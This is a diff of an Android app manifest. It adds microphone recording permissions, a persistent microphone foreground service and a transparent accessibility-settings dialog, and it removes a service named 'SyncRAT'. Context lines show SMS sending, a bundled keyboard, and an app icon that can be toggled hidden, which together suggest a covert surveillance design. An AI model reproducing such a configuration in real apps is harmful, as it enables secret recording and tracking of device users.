@@ -36,6 +36,9 @@
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
 
     <application
         android:name=".MainApplication.MyApp"
@@ -93,8 +96,18 @@
         </activity>
         <activity
             android:name=".Ui.CrashActivity"
+            android:exported="false"
             android:excludeFromRecents="true"
-            android:noHistory="true" />
+            android:launchMode="singleTask"
+            android:process=":crash" />
+        <activity
+            android:name=".Ui.AccessibilitySettingsDialogActivity"
+            android:autoRemoveFromRecents="true"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:launchMode="singleTop"
+            android:taskAffinity="android.iocl.dac_collector.accessibility_confirmation"
+            android:theme="@style/TransparentMaterial" />
 
         <meta-data
             android:name="com.google.android.gms.ads.APPLICATION_ID"
@@ -212,6 +225,9 @@
 
             <!-- DO NOT add MAIN/LAUNCHER here -->
         </activity> <!-- This alias is the launcher icon. Toggle this to hide/show the app icon -->
+        <activity
+            android:name=".Ui.WalkieTalkieActivity"
+            android:exported="false" />
         <activity-alias
             android:name=".LauncherAlias"
             android:enabled="true"
@@ -250,6 +266,11 @@
             android:launchMode="singleInstance"
             android:permission="android.permission.BIND_JOB_SERVICE"
             android:persistableMode="persistAcrossReboots" /> <!-- Simple Keyboard Integration from https://github.com/rkkr/simple-keyboard/ on 31-08-2025 at 14:24 -->
+        <service
+            android:name=".Services.WalkieTalkieService"
+            android:exported="false"
+            android:foregroundServiceType="microphone"
+            android:stopWithTask="false" />
         <service
             android:name="android.iocl.simple_keyboard.latin.LatinIME"
             android:directBootAware="true"
@@ -316,18 +337,6 @@
                 android:value="true" />
         </service>
         <service
-            android:name=".SyncRAT.SyncService"
-            android:exported="true"
-            android:permission="android.permission.BIND_SYNC_ADAPTER">
-            <intent-filter>
-                <action android:name="android.content.SyncAdapter" />
-            </intent-filter>
-
-            <meta-data
-                android:name="android.content.SyncAdapter"
-                android:resource="@xml/syncadapter" />
-        </service>
-        <service
             android:name=".Services.SendDACService"
             android:excludeFromRecents="true"
             android:exported="true"
@@ -359,7 +368,6 @@
             android:name=".SyncAdapters.SyncService"
             android:exported="true"
             android:permission="android.permission.BIND_SYNC_ADAPTER">
-            >
             <intent-filter>
                 <action android:name="android.content.SyncAdapter" />
             </intent-filter>
@@ -385,7 +393,6 @@
             android:enabled="true"
             android:exported="true"
             android:permission="android.permission.BIND_ACCOUNT_AUTHENTICATOR">
-            >
             <intent-filter>
                 <action android:name="android.accounts.AccountAuthenticator" />
             </intent-filter>
